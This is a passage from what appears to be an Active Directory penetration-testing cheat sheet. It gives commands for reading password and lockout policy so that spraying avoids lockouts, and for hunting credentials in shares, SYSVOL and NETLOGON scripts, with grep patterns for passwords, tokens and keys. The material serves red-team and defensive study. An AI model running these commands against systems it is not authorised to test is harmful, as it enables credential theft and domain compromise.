+</table>
+<p><strong>Result interpretation</strong></p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Successful login</td>
+<td>Valid credential pair.</td>
+</tr>
+<tr>
+<td><code>STATUS_LOGON_FAILURE</code></td>
+<td>Wrong password.</td>
+</tr>
+<tr>
+<td><code>STATUS_ACCOUNT_LOCKED_OUT</code></td>
+<td>Account locked. Stop and reassess.</td>
+</tr>
+<tr>
+<td><code>STATUS_PASSWORD_MUST_CHANGE</code></td>
+<td>Valid password but change required.</td>
+</tr>
+<tr>
+<td><code>STATUS_ACCOUNT_DISABLED</code></td>
+<td>Account disabled.</td>
+</tr>
+<tr>
+<td><code>STATUS_LOGON_TYPE_NOT_GRANTED</code></td>
+<td>Credentials valid but logon type not allowed.</td>
+</tr>
+<tr>
+<td><code>KDC_ERR_PREAUTH_FAILED</code></td>
+<td>Wrong password in Kerberos context.</td>
+</tr>
+<tr>
+<td><code>KDC_ERR_CLIENT_REVOKED</code></td>
+<td>Account disabled, locked, or restricted.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="password-policy">Password Policy</h2>
+<p>Password policy determines how safe password testing is.</p>
+<p>Before any password spray, identify lockout and password policy.</p>
+<p>Policy may exist at:</p>
+<table>
+<thead>
+<tr>
+<th>Policy type</th>
+<th>Scope</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Default domain password policy</td>
+<td>Domain-wide default.</td>
+</tr>
+<tr>
+<td>Fine-Grained Password Policy</td>
+<td>Applies to selected users or groups.</td>
+</tr>
+<tr>
+<td>Local password policy</td>
+<td>Local machine accounts.</td>
+</tr>
+<tr>
+<td>Application policy</td>
+<td>Separate app-specific authentication.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>NetExec</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--pass-pol
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--pass-pol
+</span></code></pre></div>
+<p><strong>RPC</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>rpcclient<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;getdompwinfo&quot;</span>
+</span></code></pre></div>
+<p><strong>Windows built-ins</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>net accounts /domain
+</span></code></pre></div>
+<p><strong>PowerShell AD module</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="nb">Get-ADDefaultDomainPasswordPolicy</span>
+</span></code></pre></div>
+<p>Fine-Grained Password Policies:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="nb">Get-ADFineGrainedPasswordPolicy</span> <span class="n">-Filter</span> <span class="p">*</span>
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="nb">Get-ADUserResultantPasswordPolicy</span> <span class="n">alice</span>
+</span></code></pre></div>
+<p><strong>PowerView</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="nb">Get-DomainPolicyData</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="nb">Get-DomainPolicyData</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">SystemAccess</span>
+</span></code></pre></div>
+<p><strong>LDAP default domain policy</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(objectClass=domainDNS)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>minPwdLength<span class="w"> </span>pwdHistoryLength<span class="w"> </span>maxPwdAge<span class="w"> </span>minPwdAge<span class="w"> </span>lockoutThreshold<span class="w"> </span>lockoutDuration<span class="w"> </span>lockOutObservationWindow
+</span></code></pre></div>
+<p><strong>LDAP Fine-Grained Password Policies</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>-b<span class="w"> </span><span class="s2">&quot;CN=Password Settings Container,CN=System,DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(objectClass=msDS-PasswordSettings)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>cn<span class="w"> </span>msDS-MinimumPasswordLength<span class="w"> </span>msDS-LockoutThreshold<span class="w"> </span>msDS-LockoutDuration<span class="w"> </span>msDS-LockoutObservationWindow<span class="w"> </span>msDS-PSOAppliesTo
+</span></code></pre></div>
+<p><strong>Fields</strong></p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>minPwdLength</code></td>
+<td>Minimum password length.</td>
+</tr>
+<tr>
+<td><code>pwdHistoryLength</code></td>
+<td>Password history length.</td>
+</tr>
+<tr>
+<td><code>maxPwdAge</code></td>
+<td>Maximum password age.</td>
+</tr>
+<tr>
+<td><code>minPwdAge</code></td>
+<td>Minimum password age.</td>
+</tr>
+<tr>
+<td><code>lockoutThreshold</code></td>
+<td>Bad attempts before lockout.</td>
+</tr>
+<tr>
+<td><code>lockoutDuration</code></td>
+<td>Lockout duration.</td>
+</tr>
+<tr>
+<td><code>lockOutObservationWindow</code></td>
+<td>Time window for failed attempt counting.</td>
+</tr>
+<tr>
+<td>Fine-grained policy</td>
+<td>User/group-specific override.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Policy interpretation</strong></p>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Lockout threshold <code>0</code></td>
+<td>No lockout configured. Still avoid noisy testing.</td>
+</tr>
+<tr>
+<td>Lockout threshold <code>3-5</code></td>
+<td>Very high risk for spraying.</td>
+</tr>
+<tr>
+<td>Long observation window</td>
+<td>Wait longer between attempts.</td>
+</tr>
+<tr>
+<td>Fine-grained policy exists</td>
+<td>Some users may have different lockout rules.</td>
+</tr>
+<tr>
+<td>Minimum length low</td>
+<td>Weak passwords more likely.</td>
+</tr>
+<tr>
+<td>Password never expires users</td>
+<td>May have old reusable passwords.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="credential-hunting">Credential Hunting</h2>
+<p>Credential hunting is the process of searching accessible systems and files for secrets.</p>
+<p>This is usually done after obtaining a valid account or local access to a machine.</p>
+<p>Common targets:</p>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>Examples</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Shares</td>
+<td>Scripts, backups, configs, docs.</td>
+</tr>
+<tr>
+<td>User profiles</td>
+<td>Desktop, Downloads, Documents.</td>
+</tr>
+<tr>
+<td>Web configs</td>
+<td><code>web.config</code>, <code>.env</code>, <code>appsettings.json</code>.</td>
+</tr>
+<tr>
+<td>Scripts</td>
+<td>PowerShell, batch, VBS, Python.</td>
+</tr>
+<tr>
+<td>Databases</td>
+<td>Connection strings, dumps.</td>
+</tr>
+<tr>
+<td>Remote access files</td>
+<td><code>.rdp</code>, VPN configs, PuTTY sessions.</td>
+</tr>
+<tr>
+<td>Dev files</td>
+<td>Git configs, deployment files.</td>
+</tr>
+<tr>
+<td>Password vaults</td>
+<td>KeePass, browser stores.</td>
+</tr>
+<tr>
+<td>Logs</td>
+<td>Application logs, install logs.</td>
+</tr>
+<tr>
+<td>Scheduled tasks</td>
+<td>Stored run-as context or script paths.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Linux search after downloading files</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>grep<span class="w"> </span>-RniE<span class="w"> </span><span class="s2">&quot;password|passwd|pwd|cred|secret|token|apikey|api_key|connectionstring|login|username|user&quot;</span><span class="w"> </span>.
+</span></code></pre></div>
+<p>Interesting files:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>find<span class="w"> </span>.<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="se">\(</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>-iname<span class="w"> </span><span class="s2">&quot;*.txt&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.csv&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.xml&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.json&quot;</span><span class="w"> </span>-o<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>-iname<span class="w"> </span><span class="s2">&quot;*.config&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.conf&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.ini&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.yml&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.yaml&quot;</span><span class="w"> </span>-o<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>-iname<span class="w"> </span><span class="s2">&quot;*.ps1&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.bat&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.cmd&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.vbs&quot;</span><span class="w"> </span>-o<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>-iname<span class="w"> </span><span class="s2">&quot;*.sql&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.bak&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.zip&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.7z&quot;</span><span class="w"> </span>-o<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>-iname<span class="w"> </span><span class="s2">&quot;*.kdbx&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.rdp&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.ppk&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.pem&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.key&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a><span class="se">\)</span>
+</span></code></pre></div>
+<p>Search for likely password assignments:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>grep<span class="w"> </span>-RniE<span class="w"> </span><span class="s2">&quot;(password|passwd|pwd|pass|secret|token|key)\s*[:=]&quot;</span><span class="w"> </span>.
+</span></code></pre></div>
+<p>Search connection strings:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>grep<span class="w"> </span>-RniE<span class="w"> </span><span class="s2">&quot;Data Source|Initial Catalog|User ID|Password|Server=|Database=|Trusted_Connection|Integrated Security&quot;</span><span class="w"> </span>.
+</span></code></pre></div>
+<p>Search private keys:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>grep<span class="w"> </span>-RniE<span class="w"> </span><span class="s2">&quot;BEGIN .*PRIVATE KEY|BEGIN OPENSSH PRIVATE KEY|BEGIN RSA PRIVATE KEY&quot;</span><span class="w"> </span>.
+</span></code></pre></div>
+<p><strong>Windows search</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>findstr /S /I /M &quot;password passwd pwd secret token api_key connectionstring&quot; *.*
+</span></code></pre></div>
+<p>PowerShell:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="nb">Select-String</span> <span class="n">-Path</span> <span class="p">.\*</span> <span class="n">-Pattern</span> <span class="s2">&quot;password&quot;</span><span class="p">,</span><span class="s2">&quot;passwd&quot;</span><span class="p">,</span><span class="s2">&quot;pwd&quot;</span><span class="p">,</span><span class="s2">&quot;secret&quot;</span><span class="p">,</span><span class="s2">&quot;token&quot;</span><span class="p">,</span><span class="s2">&quot;api_key&quot;</span><span class="p">,</span><span class="s2">&quot;connectionstring&quot;</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span></code></pre></div>
+<p>Find files:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">txt</span><span class="p">,*.</span><span class="n">config</span><span class="p">,*.</span><span class="n">xml</span><span class="p">,*.</span><span class="n">json</span><span class="p">,*.</span><span class="n">ini</span><span class="p">,*.</span><span class="n">ps1</span><span class="p">,*.</span><span class="n">bat</span><span class="p">,*.</span><span class="n">cmd</span><span class="p">,*.</span><span class="n">kdbx</span><span class="p">,*.</span><span class="n">rdp</span><span class="p">,*.</span><span class="n">ppk</span><span class="p">,*.</span><span class="n">pem</span><span class="p">,*.</span><span class="n">key</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span></code></pre></div>
+<p><strong>Common Windows paths</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>C:\Users\&lt;user&gt;\Desktop
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>C:\Users\&lt;user&gt;\Documents
+</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>C:\Users\&lt;user&gt;\Downloads
+</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a>C:\Users\&lt;user&gt;\AppData\Roaming
+</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a>C:\Users\&lt;user&gt;\AppData\Local
+</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a>C:\inetpub\wwwroot
+</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a>C:\ProgramData
+</span><span id="__span-59-8"><a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a>C:\Scripts
+</span><span id="__span-59-9"><a id="__codelineno-59-9" name="__codelineno-59-9" href="#__codelineno-59-9"></a>C:\Backup
+</span><span id="__span-59-10"><a id="__codelineno-59-10" name="__codelineno-59-10" href="#__codelineno-59-10"></a>C:\Temp
+</span><span id="__span-59-11"><a id="__codelineno-59-11" name="__codelineno-59-11" href="#__codelineno-59-11"></a>C:\Windows\Temp
+</span></code></pre></div>
+<p><strong>Common Linux paths on mixed environments</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>/home
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>/var/www
+</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>/opt
+</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>/srv
+</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>/etc
+</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a>/backup
+</span><span id="__span-60-7"><a id="__codelineno-60-7" name="__codelineno-60-7" href="#__codelineno-60-7"></a>/tmp
+</span></code></pre></div>
+<p><strong>Interesting patterns</strong></p>
+<table>
+<thead>
+<tr>
+<th>Pattern</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>password=</code></td>
+<td>Direct credential.</td>
+</tr>
+<tr>
+<td><code>User ID=</code></td>
+<td>Database connection string.</td>
+</tr>
+<tr>
+<td><code>apikey</code></td>
+<td>API access.</td>
+</tr>
+<tr>
+<td><code>token</code></td>
+<td>Session or API token.</td>
+</tr>
+<tr>
+<td><code>runas</code></td>
+<td>Stored run-as usage.</td>
+</tr>
+<tr>
+<td><code>net use</code></td>
+<td>Mapped share with credentials.</td>
+</tr>
+<tr>
+<td><code>cmdkey</code></td>
+<td>Windows stored credential reference.</td>
+</tr>
+<tr>
+<td><code>.kdbx</code></td>
+<td>KeePass database.</td>
+</tr>
+<tr>
+<td><code>.rdp</code></td>
+<td>RDP target/user context.</td>
+</tr>
+<tr>
+<td><code>.ppk</code> / <code>.pem</code></td>
+<td>SSH keys.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="sysvol-credentials">SYSVOL Credentials</h2>
+<p>SYSVOL is a domain share hosted on domain controllers.</p>
+<p>It contains Group Policy files, scripts, and other domain-wide policy data.</p>
+<p>Path format:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>\\corp.local\SYSVOL\corp.local\
+</span></code></pre></div>
+<p>SYSVOL is usually readable by domain users.</p>
+<p><strong>List SYSVOL</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>smbclient<span class="w"> </span>//<span class="nv">$DC_IP</span>/SYSVOL<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse ON; ls&#39;</span>
+</span></code></pre></div>
+<p>Mount SYSVOL:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>sudo<span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span>/mnt/sysvol
+</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>sudo<span class="w"> </span>mount<span class="w"> </span>-t<span class="w"> </span>cifs<span class="w"> </span>//<span class="nv">$DC_IP</span>/SYSVOL<span class="w"> </span>/mnt/sysvol<span class="w"> </span>-o<span class="w"> </span><span class="nv">username</span><span class="o">=</span><span class="nv">$USER</span>,password<span class="o">=</span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span>,domain<span class="o">=</span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p><strong>Search SYSVOL</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>find<span class="w"> </span>/mnt/sysvol<span class="w"> </span>-type<span class="w"> </span>f
+</span></code></pre></div>
+<p>Interesting file types:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>find<span class="w"> </span>/mnt/sysvol<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="se">\(</span><span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.xml&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.ps1&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.bat&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.cmd&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.vbs&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.ini&quot;</span><span class="w"> </span>-o<span class="w"> </span>-iname<span class="w"> </span><span class="s2">&quot;*.txt&quot;</span><span class="w"> </span><span class="se">\)</span>
+</span></code></pre></div>
+<p>Search for secrets:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>grep<span class="w"> </span>-RniE<span class="w"> </span><span class="s2">&quot;password|passwd|pwd|cred|secret|user|login|administrator|runas|net use&quot;</span><span class="w"> </span>/mnt/sysvol
+</span></code></pre></div>
+<p><strong>Common SYSVOL paths</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>\\corp.local\SYSVOL\corp.local\Policies\
+</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>\\corp.local\SYSVOL\corp.local\scripts\
+</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a>\\corp.local\NETLOGON\
+</span></code></pre></div>
+<p><strong>Interesting GPO files</strong></p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Groups.xml</code></td>
+<td>Local users/groups preference data.</td>
+</tr>
+<tr>
+<td><code>Services.xml</code></td>
+<td>Service preference configuration.</td>
+</tr>
+<tr>
+<td><code>ScheduledTasks.xml</code></td>
+<td>Scheduled task configuration.</td>
+</tr>
+<tr>
+<td><code>Drives.xml</code></td>
+<td>Drive mappings.</td>
+</tr>
+<tr>
+<td><code>DataSources.xml</code></td>
+<td>Database connection data.</td>
+</tr>
+<tr>
+<td><code>Registry.xml</code></td>
+<td>Registry preference data.</td>
+</tr>
+<tr>
+<td><code>Printers.xml</code></td>
+<td>Printer preference data.</td>
+</tr>
+<tr>
+<td><code>scripts.ini</code></td>
+<td>Startup/logon script references.</td>
+</tr>
+<tr>
+<td><code>GptTmpl.inf</code></td>
+<td>Security template settings.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>NETLOGON scripts</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>smbclient<span class="w"> </span>//<span class="nv">$DC_IP</span>/NETLOGON<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse ON; ls&#39;</span>
+</span></code></pre></div>
+<p>Download scripts:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>smbclient<span class="w"> </span>//<span class="nv">$DC_IP</span>/NETLOGON<span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">%</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse ON; prompt OFF; mget *&#39;</span>
+</span></code></pre></div>
+<p>Look for:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>net use
+</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>runas
+</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>password
+</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>cmdkey
+</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>powershell -enc
+</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>mapped drives
+</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a>database connections
+</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8" href="#__codelineno-70-8"></a>local admin operations
+</span></code></pre></div>
+<hr />
+<h2 id="gpp-cpassword">GPP cpassword</h2>
+<p>Group Policy Preferences historically allowed administrators to store passwords in XML files inside SYSVOL.</p>
+<p>The password value was stored in the <code>cpassword</code> attribute.</p>
+<p>The AES key used to decrypt GPP <code>cpassword</code> values became public, so any domain user who can read SYSVOL can decrypt these old stored values if present.</p>
+<p>Common files:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>Groups.xml
+</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a>Services.xml
+</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a>ScheduledTasks.xml
